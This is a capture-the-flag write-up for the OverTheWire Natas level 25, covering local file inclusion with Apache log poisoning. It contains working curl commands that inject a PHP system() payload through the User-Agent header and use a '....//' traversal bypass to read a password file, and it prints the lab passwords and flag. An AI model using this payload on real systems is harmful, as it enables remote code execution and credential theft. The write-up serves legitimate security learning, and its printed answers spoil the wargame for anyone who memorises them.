# CHALLENGE
ACCESS NEXT LEVEL'S PASSWORD AND HAVE SOME FUN USING YOUR BRAIN \
Given: \
Password:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
Username: natas25\
URL:      http://natas25.natas.labs.overthewire.org
# SOLUTION
1.Login \
<img width="964" height="810" alt="image" src="https://github.com/user-attachments/assets/b40d208e-b4f7-4936-8721-dce36dad7a05" /> \
2.READ THE QUOTE ,ITS WORTH IT.JUST TO SEE HOW BULLSHIT SOME MINDS ARE CLAIMING GOD DOESNT EXIST. \
3.View source Code \
<img width="866" height="791" alt="image" src="https://github.com/user-attachments/assets/3f73b2a7-d4a6-417f-abe3-899aebb84d02" /> \
4.INTEPRETE 
 - This level combines:
  - Local File Inclusion (LFI)
  - Log poisoning
  - PHP execution through Apache logs
 - The vulnerable application blocks direct traversal like:
  - ../
 - but it logs the User-Agent header into a file you can later include.
 - Now,another issue is that the log files change on each access.So we have to poison the log and traverse in the same request
 - SO HOW DO WE DO THIS?

5.EXPLOIT
 - Step 1 — Poison the log and traverse
   - curl -c cookies.txt -H 'User-Agent: <?php system("cat /etc/natas_webpass/natas26"); ?>' -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd"
   - <img width="935" height="696" alt="image" src="https://github.com/user-attachments/assets/79087421-8f87-45f9-ba61-3599e18a5667" />
   - basically we download the cookies file so we can read the phpsession id so that we can use it
 - Step 2 - Read the cookie.txt
   -  <img width="944" height="208" alt="image" src="https://github.com/user-attachments/assets/fd18aca7-aaec-4458-b268-92c03d0fd0ae" />
 - Step 3  - Include the poisoned logfile
   - curl -b cookies.txt -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_abc123.log"
   - <img width="976" height="953" alt="image" src="https://github.com/user-attachments/assets/2b860266-b7c7-4c50-b32a-69898653489c" />
   - When the poisoned log is included:
    - PHP executes
    - system('cat /etc/natas_webpass/natas26')
    - next password is revealed

# Flag: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
